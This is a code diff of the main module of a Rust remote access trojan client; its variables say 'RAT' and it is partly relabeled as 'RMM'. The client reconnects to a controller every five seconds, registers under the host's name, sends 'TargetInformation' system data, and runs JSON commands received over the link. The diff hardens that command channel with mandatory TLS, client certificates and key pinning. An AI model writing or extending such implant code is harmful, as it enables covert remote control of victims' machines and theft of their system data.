@@ -3,112 +3,95 @@ use std::str::FromStr;
 use std::time::Duration;
 use sysinfo::System;
 use tokio::sync::mpsc;
-use tokio_tungstenite::{connect_async, tungstenite::Message};
+use tokio_tungstenite::tungstenite::{Message, http};
+use tokio_tungstenite::{Connector, connect_async_tls_with_config};
 
 use crate::dispatcher::{CommandMessage, Dispatcher};
-use crate::utils::{
-    get_connection_info, is_port_valid, is_valid_ip, validate_tls_connection, Connection,
-};
+use crate::tls::{TlsSettings, build_rustls_client_config};
+use crate::utils::Connection;
 
 mod actors;
 mod dispatcher;
+#[cfg(feature = "chat")]
 mod gui;
+mod tls;
 mod utils;
+pub const WS_CHAN_CAP: usize = 128;
+
 #[tokio::main]
 async fn main() {
-    let host_ip = std::env::var("RAT_HOST_IP")
-        .unwrap_or_else(|_| "127.0.0.1".to_string())
-        .to_string();
-    let host_port = std::env::var("RAT_HOST_PORT").unwrap_or_else(|_| "8000".to_string());
+    let host_port = std::env::var("RAT_HOST_PORT").unwrap_or_else(|_| "443".to_string());
+    let port_u16 = u16::from_str(&host_port).expect("RAT_HOST_PORT must be a valid u16");
+
     let use_tls = std::env::var("RAT_USE_TLS")
-        .unwrap_or_else(|_| "false".to_string())
+        .unwrap_or_else(|_| "true".to_string())
         .to_lowercase()
         == "true";
 
-    if !is_valid_ip(&host_ip) || !is_port_valid(&host_port) {
-        panic!();
-    }
-
-    // Validate TLS configuration
-    if use_tls
-        && !validate_tls_connection(&host_ip, i32::from_str(&host_port).expect("Invalid port"))
-    {
-        dev_print!("Warning: TLS validation failed, but proceeding anyway");
-    }
-
-    dev_print!("{}", get_connection_info(use_tls));
-
-    let connection = Connection::from(
-        host_ip.to_string(),
-        i32::from_str(&host_port).expect("Invalid compile-time port"),
-        use_tls,
-    );
+    let connection = Connection::from(i32::from(port_u16), use_tls);
 
     loop {
-        dev_print!(
-            "Attempting to establish a {} connection to {}:{}",
-            if connection.use_tls {
-                "secure (TLS)"
-            } else {
-                "plain"
-            },
-            connection.ip,
-            connection.port
-        );
-
         if let Err(e) = run_connection_lifecycle(connection.clone()).await {
-            dev_eprint!(
-                "Connection lifecycle ended with an error: {}. Retrying in 5 seconds...",
-                e
-            );
+            eprintln!("Connection lifecycle error: {e}. Retrying in 5s…");
         } else {
-            dev_print!("Connection closed gracefully. Reconnecting in 5 seconds...");
+            eprintln!("Connection closed. Reconnecting in 5s…");
         }
-
         tokio::time::sleep(Duration::from_secs(5)).await;
     }
 }
 
-async fn run_connection_lifecycle(connection: Connection) -> anyhow::Result<()> {
+pub async fn run_connection_lifecycle(connection: Connection) -> anyhow::Result<()> {
+    if !connection.use_tls {
+        anyhow::bail!("Plain WS is disallowed. Set RAT_USE_TLS=true and configure TLS vars.");
+    }
+
+    let domain = std::env::var("RMM_DOMAIN")
+        .map_err(|_| anyhow::anyhow!("RMM_DOMAIN (DNS name) is required"))?;
+
+    if domain.parse::<std::net::IpAddr>().is_ok() {
+        anyhow::bail!("RMM_DOMAIN must be a DNS name, not an IP.");
+    }
+
+    let tls_settings = TlsSettings {
+        domain: domain.clone(),
+        client_cert_pem: std::env::var("RMM_TLS_CLIENT_CERT")
+            .map_err(|_| anyhow::anyhow!("RMM_TLS_CLIENT_CERT is required"))?,
+        client_key_pem: std::env::var("RMM_TLS_CLIENT_KEY")
+            .map_err(|_| anyhow::anyhow!("RMM_TLS_CLIENT_KEY is required"))?,
+        spki_pins_sha256_b64: std::env::var("RMM_TLS_SPKI_SHA256")
+            .map_err(|_| anyhow::anyhow!("RMM_TLS_SPKI_SHA256 is required"))?
+            .split(',')
+            .map(|s| s.trim().to_string())
+            .filter(|s| !s.is_empty())
+            .collect(),
+        use_native_roots: true,
+    };
+    let tls_cfg = build_rustls_client_config(&tls_settings)?;
+    let connector = Some(Connector::Rustls(tls_cfg));
+
     let client_id = System::host_name().unwrap_or_else(|| "unknown_client".to_string());
 
-    let scheme = if connection.use_tls { "wss" } else { "ws" };
-    let url_str = format!(
-        "{}://{}:{}/ws/{}",
-        scheme, connection.ip, connection.port, client_id
-    );
-    let url = url::Url::parse(&url_str)?;
+    let url = url::Url::parse(&format!(
+        "wss://{}:{}/ws/{}",
+        tls_settings.domain, connection.port, client_id
+    ))?;
 
-    let (ws_stream, _response) = match connect_async(url.as_str()).await {
-        Ok((stream, response)) => {
-            dev_print!("WebSocket handshake successful");
-            (stream, response)
-        }
-        Err(e) => {
-            let error_msg = if connection.use_tls {
-                format!("Failed to establish secure WebSocket connection: {}. Check if the server supports TLS/SSL.", e)
-            } else {
-                format!("Failed to connect to WebSocket: {}", e)
-            };
-            return Err(anyhow::anyhow!(error_msg));
-        }
-    };
-    dev_print!(
-        "Successfully connected to {} (TLS: {})",
-        url_str,
-        connection.use_tls
-    );
+    let request = http::Request::builder()
+        .uri(url.to_string())
+        .header("Host", &domain)
+        .body(())?;
+
+    let (ws_stream, _response) =
+        connect_async_tls_with_config(request, None, false, connector).await?;
+    eprintln!("WebSocket(TLS) handshake OK with {}", domain);
 
     let (mut writer, mut reader) = ws_stream.split();
 
-    // multiplexor
-    let (ws_sender, mut ws_receiver) = mpsc::channel::<Message>(128);
-
-    // task that will own writer and listen to the chanel
-    let _writer_task = tokio::spawn(async move {
-        while let Some(message_to_send) = ws_receiver.recv().await {
-            if writer.send(message_to_send).await.is_err() {
-                dev_eprint!("WebSocket write error. Closing writer task.");
+    let (ws_sender, mut ws_receiver) = mpsc::channel::<Message>(WS_CHAN_CAP);
+    let writer_task = tokio::spawn(async move {
+        while let Some(out) = ws_receiver.recv().await {
+            if writer.send(out).await.is_err() {
+                eprintln!("WebSocket write failed. Closing writer task.");
                 break;
             }
         }
@@ -116,24 +99,29 @@ async fn run_connection_lifecycle(connection: Connection) -> anyhow::Result<()> 
 
     let dispatcher = Dispatcher::new(ws_sender.clone());
 
-    let sysinfo = utils::TargetInformation::get().to_string();
+    let sysinfo = crate::utils::TargetInformation::get().to_string();
     ws_sender.send(Message::Text(sysinfo)).await?;
-    dev_print!("System info sent.");
 
     while let Some(msg) = reader.next().await {
         let msg = msg?;
-
-        if let Message::Text(text) = msg {
-            dev_print!("Received command: {}", text);
-
-            if let Ok(cmd_msg) = serde_json::from_str::<CommandMessage>(&text) {
-                if let Err(e) = dispatcher.dispatch(cmd_msg).await {
-                    dev_eprint!("{}", e);
+        match msg {
+            Message::Text(text) => match serde_json::from_str::<CommandMessage>(&text) {
+                Ok(cmd) => {
+                    if let Err(e) = dispatcher.dispatch(cmd).await {
+                        eprintln!("Dispatch error: {e}");
+                    }
                 }
-            } else {
-                dev_eprint!("Failed to parse command: {}", text);
+                Err(e) => eprintln!("Bad command JSON: {e}; raw={text}"),
+            },
+            Message::Close(_) => {
+                break;
             }
+            _ => {}
         }
     }
+
+    drop(ws_sender);
+    let _ = writer_task.await;
+
     Ok(())
 }
